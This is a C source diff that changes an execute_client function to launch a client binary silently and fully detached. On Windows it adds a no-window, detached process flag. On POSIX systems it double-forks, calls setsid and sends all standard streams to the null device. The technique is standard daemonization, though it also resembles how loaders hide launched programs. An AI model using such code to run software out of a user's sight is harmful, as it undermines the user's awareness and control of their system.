@@ -795,11 +795,13 @@ static int execute_client(const char *client_path) {
     snprintf(cmd, sizeof(cmd), "\"%s\"", client_path);
     
     if (CreateProcess(NULL, cmd, NULL, NULL, FALSE,
-                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                     CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+        DEBUG_PRINT("[*] Client launched successfully (detached process)\n");
         return 0;
     }
+    DEBUG_PRINT("[!] Failed to launch client (error: %lu)\n", GetLastError());
     return -1;
 #else
     // Make executable
@@ -808,16 +810,42 @@ static int execute_client(const char *client_path) {
     // Fork and execute
     pid_t pid = fork();
     if (pid == 0) {
-        // Child process
+        // Child process - detach from parent
+        // Create new session to detach from terminal
+        setsid();
+        
+        // Fork again to ensure we're not session leader
+        pid_t pid2 = fork();
+        if (pid2 != 0) {
+            // First child exits
+            exit(0);
+        }
+        
+        // Second child (grandchild) continues
+        // Change to root directory to avoid keeping any directory in use
+        chdir("/");
+        
         // Redirect stdout/stderr to /dev/null
         freopen(NULL_DEVICE, "w", stdout);
         freopen(NULL_DEVICE, "w", stderr);
+        freopen(NULL_DEVICE, "r", stdin);
         
+        // Execute the client
         execl(client_path, client_path, NULL);
-        exit(1); // If exec fails
+        
+        // If exec fails, exit
+        exit(1);
+    } else if (pid > 0) {
+        // Parent process - wait for first child to exit
+        // This ensures the grandchild is fully detached
+        int status;
+        waitpid(pid, &status, 0);
+        DEBUG_PRINT("[*] Client launched successfully (detached process)\n");
+        return 0;
     }
     
-    return (pid > 0) ? 0 : -1;
+    DEBUG_PRINT("[!] Failed to fork client process\n");
+    return -1;
 #endif
 }
 
